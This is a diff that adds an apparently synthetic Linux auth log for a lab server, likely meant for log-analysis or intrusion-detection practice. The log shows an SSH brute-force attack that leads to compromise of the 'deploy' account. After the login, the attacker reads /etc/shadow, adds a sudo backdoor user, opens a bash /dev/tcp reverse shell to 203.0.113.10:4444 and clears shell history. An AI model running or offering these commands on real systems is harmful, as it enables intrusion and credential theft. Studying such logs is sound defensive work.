@@ -1,0 +1,82 @@
+Oct 21 09:01:00 lab-server sshd[1001]: Accepted password for afsar from 192.0.2.25 port 55001 ssh2
+Oct 21 09:02:00 lab-server sshd[1002]: Accepted publickey for student from 192.0.2.30 port 55008 ssh2
+Oct 21 09:02:30 lab-server sudo[1003]:    afsar : TTY=pts/0 ; PWD=/home/afsar ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 21 09:03:00 lab-server sshd[1004]: Failed password for guest from 198.51.100.44 port 41222 ssh2
+Oct 21 09:05:00 lab-server sshd[1005]: Failed password for guest from 198.51.100.44 port 41224 ssh2
+Oct 21 09:09:00 lab-server sshd[1006]: Failed password for guest from 198.51.100.44 port 41226 ssh2
+Oct 21 09:10:00 lab-server sshd[1007]: Invalid user admin from 203.0.113.10 port 44210
+Oct 21 09:10:00 lab-server sshd[1008]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=admin
+Oct 21 09:10:00 lab-server sshd[1009]: Failed password for invalid user admin from 203.0.113.10 port 44210 ssh2
+Oct 21 09:10:04 lab-server sshd[1010]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=root
+Oct 21 09:10:04 lab-server sshd[1011]: Failed password for root from 203.0.113.10 port 44211 ssh2
+Oct 21 09:10:08 lab-server sshd[1012]: Invalid user test from 203.0.113.10 port 44212
+Oct 21 09:10:08 lab-server sshd[1013]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=test
+Oct 21 09:10:08 lab-server sshd[1014]: Failed password for invalid user test from 203.0.113.10 port 44212 ssh2
+Oct 21 09:10:12 lab-server sshd[1015]: Invalid user oracle from 203.0.113.10 port 44213
+Oct 21 09:10:12 lab-server sshd[1016]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=oracle
+Oct 21 09:10:12 lab-server sshd[1017]: Failed password for invalid user oracle from 203.0.113.10 port 44213 ssh2
+Oct 21 09:10:16 lab-server sshd[1018]: Invalid user ubnt from 203.0.113.10 port 44214
+Oct 21 09:10:16 lab-server sshd[1019]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=ubnt
+Oct 21 09:10:16 lab-server sshd[1020]: Failed password for invalid user ubnt from 203.0.113.10 port 44214 ssh2
+Oct 21 09:10:20 lab-server sshd[1021]: Invalid user postgres from 203.0.113.10 port 44215
+Oct 21 09:10:20 lab-server sshd[1022]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=postgres
+Oct 21 09:10:20 lab-server sshd[1023]: Failed password for invalid user postgres from 203.0.113.10 port 44215 ssh2
+Oct 21 09:10:24 lab-server sshd[1024]: Invalid user pi from 203.0.113.10 port 44216
+Oct 21 09:10:24 lab-server sshd[1025]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=pi
+Oct 21 09:10:24 lab-server sshd[1026]: Failed password for invalid user pi from 203.0.113.10 port 44216 ssh2
+Oct 21 09:10:28 lab-server sshd[1027]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=deploy
+Oct 21 09:10:28 lab-server sshd[1028]: Failed password for deploy from 203.0.113.10 port 44217 ssh2
+Oct 21 09:10:32 lab-server sshd[1029]: Invalid user ftpuser from 203.0.113.10 port 44218
+Oct 21 09:10:32 lab-server sshd[1030]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=ftpuser
+Oct 21 09:10:32 lab-server sshd[1031]: Failed password for invalid user ftpuser from 203.0.113.10 port 44218 ssh2
+Oct 21 09:10:36 lab-server sshd[1032]: Invalid user git from 203.0.113.10 port 44219
+Oct 21 09:10:36 lab-server sshd[1033]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=git
+Oct 21 09:10:36 lab-server sshd[1034]: Failed password for invalid user git from 203.0.113.10 port 44219 ssh2
+Oct 21 09:10:40 lab-server sshd[1035]: Invalid user admin from 203.0.113.10 port 44220
+Oct 21 09:10:40 lab-server sshd[1036]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=admin
+Oct 21 09:10:40 lab-server sshd[1037]: Failed password for invalid user admin from 203.0.113.10 port 44220 ssh2
+Oct 21 09:10:44 lab-server sshd[1038]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=root
+Oct 21 09:10:44 lab-server sshd[1039]: Failed password for root from 203.0.113.10 port 44221 ssh2
+Oct 21 09:10:48 lab-server sshd[1040]: Invalid user test from 203.0.113.10 port 44222
+Oct 21 09:10:48 lab-server sshd[1041]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=test
+Oct 21 09:10:48 lab-server sshd[1042]: Failed password for invalid user test from 203.0.113.10 port 44222 ssh2
+Oct 21 09:10:52 lab-server sshd[1043]: Invalid user oracle from 203.0.113.10 port 44223
+Oct 21 09:10:52 lab-server sshd[1044]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=oracle
+Oct 21 09:10:52 lab-server sshd[1045]: Failed password for invalid user oracle from 203.0.113.10 port 44223 ssh2
+Oct 21 09:10:56 lab-server sshd[1046]: Invalid user ubnt from 203.0.113.10 port 44224
+Oct 21 09:10:56 lab-server sshd[1047]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=ubnt
+Oct 21 09:10:56 lab-server sshd[1048]: Failed password for invalid user ubnt from 203.0.113.10 port 44224 ssh2
+Oct 21 09:11:00 lab-server sshd[1049]: Invalid user postgres from 203.0.113.10 port 44225
+Oct 21 09:11:00 lab-server sshd[1050]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=postgres
+Oct 21 09:11:00 lab-server sshd[1051]: Failed password for invalid user postgres from 203.0.113.10 port 44225 ssh2
+Oct 21 09:11:04 lab-server sshd[1052]: Invalid user pi from 203.0.113.10 port 44226
+Oct 21 09:11:04 lab-server sshd[1053]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=pi
+Oct 21 09:11:04 lab-server sshd[1054]: Failed password for invalid user pi from 203.0.113.10 port 44226 ssh2
+Oct 21 09:11:08 lab-server sshd[1055]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10  user=deploy
+Oct 21 09:11:08 lab-server sshd[1056]: Failed password for deploy from 203.0.113.10 port 44227 ssh2
+Oct 21 09:11:15 lab-server sshd[1057]: Accepted password for deploy from 203.0.113.10 port 44300 ssh2
+Oct 21 09:11:35 lab-server sudo[1058]:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 09:11:45 lab-server useradd[1059]: new user: name=support2, UID=1005, GID=1005, home=/home/support2, shell=/bin/bash
+Oct 21 09:11:47 lab-server usermod[1060]: add 'support2' to group 'sudo'
+Oct 21 09:12:00 lab-server sudo[1061]:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
+Oct 21 09:12:15 lab-server sudo[1062]:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/history -c
+Oct 21 09:20:00 lab-server sshd[1063]: Did not receive identification string from 198.51.100.77 port 50000
+Oct 21 09:20:03 lab-server sshd[1064]: Did not receive identification string from 198.51.100.77 port 50001
+Oct 21 09:20:06 lab-server sshd[1065]: Did not receive identification string from 198.51.100.77 port 50002
+Oct 21 09:20:09 lab-server sshd[1066]: Did not receive identification string from 198.51.100.77 port 50003
+Oct 21 09:20:12 lab-server sshd[1067]: Did not receive identification string from 198.51.100.77 port 50004
+Oct 21 09:20:15 lab-server sshd[1068]: Did not receive identification string from 198.51.100.77 port 50005
+Oct 21 09:20:18 lab-server sshd[1069]: Did not receive identification string from 198.51.100.77 port 50006
+Oct 21 09:25:00 lab-server sshd[1070]: Failed password for root from 198.51.100.120 port 52000 ssh2
+Oct 21 09:25:08 lab-server sshd[1071]: Failed password for root from 198.51.100.121 port 52001 ssh2
+Oct 21 09:25:16 lab-server sshd[1072]: Failed password for root from 198.51.100.122 port 52002 ssh2
+Oct 21 09:25:24 lab-server sshd[1073]: Failed password for root from 198.51.100.123 port 52003 ssh2
+Oct 21 09:25:32 lab-server sshd[1074]: Failed password for root from 198.51.100.124 port 52004 ssh2
+Oct 21 09:25:40 lab-server sshd[1075]: Failed password for root from 198.51.100.125 port 52005 ssh2
+Oct 21 09:25:48 lab-server sshd[1076]: Failed password for root from 198.51.100.126 port 52006 ssh2
+Oct 21 09:28:20 lab-server sudo[1077]: pam_unix(sudo:auth): authentication failure; logname=student uid=1002 euid=0 tty=/dev/pts/2 ruser=student rhost=  user=student
+Oct 21 09:28:25 lab-server sudo[1078]: pam_unix(sudo:auth): authentication failure; logname=student uid=1002 euid=0 tty=/dev/pts/2 ruser=student rhost=  user=student
+Oct 21 09:28:30 lab-server sudo[1079]: pam_unix(sudo:auth): authentication failure; logname=student uid=1002 euid=0 tty=/dev/pts/2 ruser=student rhost=  user=student
+Oct 21 09:28:50 lab-server sudo[1080]:   intern : user NOT in sudoers ; TTY=pts/3 ; PWD=/home/intern ; USER=root ; COMMAND=/bin/su
+Oct 21 09:30:00 lab-server sshd[1081]: Accepted password for root from 192.0.2.99 port 40001 ssh2
+Oct 21 09:31:40 lab-server sshd[1082]: Accepted publickey for afsar from 192.0.2.77 port 55100 ssh2
